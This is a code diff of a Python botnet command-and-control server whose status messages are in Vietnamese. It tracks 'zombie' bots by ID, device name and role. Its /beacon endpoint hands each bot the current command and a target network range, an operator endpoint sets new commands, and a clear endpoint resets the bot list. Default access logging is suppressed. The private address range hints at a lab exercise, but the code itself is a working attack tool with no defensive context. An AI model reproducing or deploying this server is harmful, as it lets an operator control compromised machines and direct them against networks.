@@ -12,7 +12,6 @@ target_info = "172.28.0.0/24"
 
 class C2Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, format, *args):
-        # Suppress default noisy access logs
         return
 
     def do_POST(self):
@@ -28,20 +27,31 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
         # 1. Zombie heartbeat / beacon endpoint
         if self.path == '/beacon':
             bot_id = data.get('bot_id', self.client_address[0])
+            device_name = data.get('device_name', bot_id)
+            role = data.get('role', 'Zombie')
+            
+            is_new = bot_id not in connected_bots
             connected_bots[bot_id] = {
+                'bot_id': bot_id,
+                'device_name': device_name,
+                'role': role,
                 'last_seen': time.strftime('%H:%M:%S'),
                 'ip': self.client_address[0],
-                'status': data.get('status', 'online')
+                'status': 'online'
             }
             
             now_str = time.strftime('%H:%M:%S')
-            print(f"[{now_str}] 💀 [C2-SERVER] Nhận tín hiệu BEACON từ Bot: {bot_id} ({self.client_address[0]}) | Lệnh trả về: [{current_command.upper()}]", flush=True)
+            if is_new:
+                print(f"[{now_str}] 💀 [P0 C2 MASTER] ⚠️ ZOMBIE MỚI GIA NHẬP MẠNG LƯỚI: {device_name} ({bot_id}) | Tổng quân số: {len(connected_bots)} Zombie!", flush=True)
+            else:
+                print(f"[{now_str}] 💀 [P0 C2 MASTER] Nhận Heartbeat từ: {device_name} | Lệnh trả về: [{current_command.upper()}] (Quân số: {len(connected_bots)})", flush=True)
 
             response = {
                 'status': 'ack',
                 'command': current_command,
                 'target': target_info,
-                'interval': 5
+                'interval': 5,
+                'total_bots': len(connected_bots)
             }
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
@@ -54,13 +64,22 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             current_command = new_cmd
             now_str = time.strftime('%H:%M:%S')
             print(f"\n==================================================", flush=True)
-            print(f"[{now_str}] ⚠️ [C2-OPERATOR] ĐÃ PHÁT LỆNH MỚI: >>> {current_command.upper()} <<<", flush=True)
+            print(f"[{now_str}] ⚠️ [P0 C2 OPERATOR] ĐÃ PHÁT LỆNH MỚI: >>> {current_command.upper()} <<<", flush=True)
             print(f"==================================================\n", flush=True)
             
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.end_headers()
-            self.wfile.write(json.dumps({'status': 'ok', 'current_command': current_command}).encode('utf-8'))
+            self.wfile.write(json.dumps({'status': 'ok', 'current_command': current_command, 'bot_count': len(connected_bots)}).encode('utf-8'))
+
+        elif self.path == '/api/clear':
+            connected_bots.clear()
+            current_command = "sleep"
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({'status': 'ok', 'bot_count': 0}).encode('utf-8'))
+
         else:
             self.send_response(404)
             self.end_headers()
@@ -80,12 +99,12 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-Type', 'text/plain; charset=utf-8')
             self.end_headers()
-            self.wfile.write(b"C2 Server is running.\n")
+            self.wfile.write(b"P0 C2 Master is running.\n")
 
 if __name__ == '__main__':
     port = 8443
     print("==================================================", flush=True)
-    print("  💀 HACKER COMMAND & CONTROL (C2) SERVER ĐANG CHẠY", flush=True)
+    print("  💀 P0 - HACKER BOTNET MASTER (C2 SERVER) ĐANG CHẠY", flush=True)
     print(f"  Lắng nghe trên cổng: {port}", flush=True)
     print("==================================================", flush=True)
     server = http.server.ThreadingHTTPServer(('0.0.0.0', port), C2Handler)
